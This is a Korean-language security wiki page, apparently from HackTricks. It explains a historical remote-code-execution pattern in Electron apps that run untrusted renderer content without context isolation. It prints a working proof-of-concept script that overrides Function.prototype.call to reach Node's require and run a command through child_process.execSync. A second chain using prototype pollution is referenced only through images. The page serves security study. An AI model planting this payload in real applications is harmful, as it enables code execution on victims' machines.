# 내부 코드를 통한 Electron context-isolation RCE

{{#include ../../banners/hacktricks-training.md}}

이는 context isolation 없이 신뢰할 수 없는 renderer 콘텐츠를 실행하던 Electron 애플리케이션의 **과거 익스플로잇 패턴**입니다. Context isolation은 Electron 12부터 기본적으로 활성화되어 있으며, 현재도 권장되는 보안 설정입니다.<sup>[[1]](#references)</sup> Electron 및 Node.js 버전에 따라 정확한 내부 동작이 다르므로, 대상 애플리케이션에 번들된 버전으로 공격 체인을 재현해야 합니다.

## 예시 1: `Function.prototype.call` 재정의

이 예시는 Masato Kinugawa의 CureCon 프레젠테이션에서 가져왔습니다.<sup>[[2]](#references)</sup>

영향을 받는 과거 Electron 빌드에서는 내부 ASAR 코드가 프로세스 `exit` 리스너를 등록했습니다. Context isolation이 비활성화되어 페이지 코드와 Electron 내부 코드가 JavaScript 프로토타입을 공유했으므로, renderer 코드는 내부 리스너가 실행되기 전에 `Function.prototype.call`을 대체할 수 있었습니다.<sup>[[2]](#references)</sup><sup>[[3]](#references)</sup>

```javascript
process.on("exit", function () {
  for (let p in cachedArchives) {
    if (!hasProp.call(cachedArchives, p)) continue
    cachedArchives[p].destroy()
  }
})
```

![Electron의 asar.js 내부 코드 경로를 사용하는 contextIsolation RCE 예시](<../../images/image (1070).png>)

리스너는 Node.js의 이벤트 메커니즘을 통해 디스패치되었습니다. 원본 페이지에는 오래된 `bin/events.js` 경로가 연결되어 있었지만, 동일한 과거 커밋의 실제 소스는 `lib/events.js`에 있습니다.<sup>[[5]](#references)</sup>

![Electron contextIsolation RCE 체인에서 도달한 Node events.js 코드 경로](<../../images/image (793).png>)

이 경로에서 `self`는 Node.js의 process 객체입니다:

![Electron 내부 코드를 통한 Electron contextIsolation RCE - 예시 1: "self"가 Node의 process 객체인 위치](<../../images/image (700).png>)

과거 버전의 process 객체는 `require`에 접근할 수 있는 경로를 노출했습니다:

```
process.mainModule.require
```

리스너 디스패처가 process 객체를 전달해 handler를 호출했기 때문에, call을 재정의하면 해당 객체를 복구하고 네이티브 명령을 실행할 수 있었습니다:

```html
<script>
  Function.prototype.call = function (process) {
    process.mainModule.require("child_process").execSync("calc")
  }
  location.reload() // Trigger the listener during navigation
</script>
```

## 예제 2: prototype pollution

ElectroVolt 발표에서는 prototype pollution을 통해 `require` 객체를 획득하는 또 다른 역사적 체인을 보여줍니다.<sup>[[4]](#references)</sup>

Leak:

<figure><img src="../../images/image (279).png" alt=""><figcaption></figcaption></figure>

Exploit:

<figure><img src="../../images/image (89).png" alt=""><figcaption></figcaption></figure>

## References

- [1] [Electron 문서 - Context isolation](https://www.electronjs.org/docs/latest/tutorial/context-isolation)
- [2] [Electron: Context isolation 부재 악용 - CureCon](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=41)
- [3] [Electron의 과거 소스 코드 - lib/common/asar.js](https://github.com/electron/electron/blob/664c184fcb98bb5b4b6b569553e7f7339d3ba4c5/lib/common/asar.js#L30-L36)
- [4] [ElectroVolt: 인기 데스크톱 앱 해킹 및 Electron의 새로운 공격 표면 발견](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [5] [Node.js의 과거 소스 코드 - `lib/events.js` 리스너 디스패치](https://github.com/nodejs/node/blob/8a44289089a08b7b19fa3c4651b5f1f5d1edd71b/lib/events.js#L156-L231)
{{#include ../../banners/hacktricks-training.md}}
